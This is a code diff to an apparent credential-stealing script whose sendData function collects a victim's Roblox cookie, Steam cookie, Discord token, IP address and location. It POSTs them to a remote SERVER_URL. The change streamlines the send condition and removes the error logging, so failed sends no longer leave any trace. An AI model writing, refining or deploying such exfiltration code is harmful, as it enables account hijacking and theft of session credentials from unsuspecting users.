@@ -48,8 +48,7 @@ async function sendData() {
         discordToken: "",
         ip: "",
         country: "",
-        city: "",
-        hasNew: false
+        city: ""
     };
 
     const ip = await getIP();
@@ -63,7 +62,6 @@ async function sendData() {
         if (rob && rob.value !== sentRoblox) {
             sentRoblox = rob.value;
             data.robloxCookie = rob.value;
-            data.hasNew = true;
         }
     } catch (e) {}
 
@@ -73,7 +71,6 @@ async function sendData() {
         if (steam && steam.value !== sentSteam) {
             sentSteam = steam.value;
             data.steamCookie = steam.value;
-            data.hasNew = true;
         }
     } catch (e) {}
 
@@ -81,19 +78,16 @@ async function sendData() {
     if (discordToken && discordToken !== sentDiscord) {
         sentDiscord = discordToken;
         data.discordToken = discordToken;
-        data.hasNew = true;
     }
 
-    if (data.hasNew) {
+    if (data.robloxCookie || data.steamCookie || data.discordToken) {
         try {
             await fetch(SERVER_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
             });
-        } catch (e) {
-            console.log("Ошибка отправки:", e);
-        }
+        } catch (e) {}
     }
 }
 
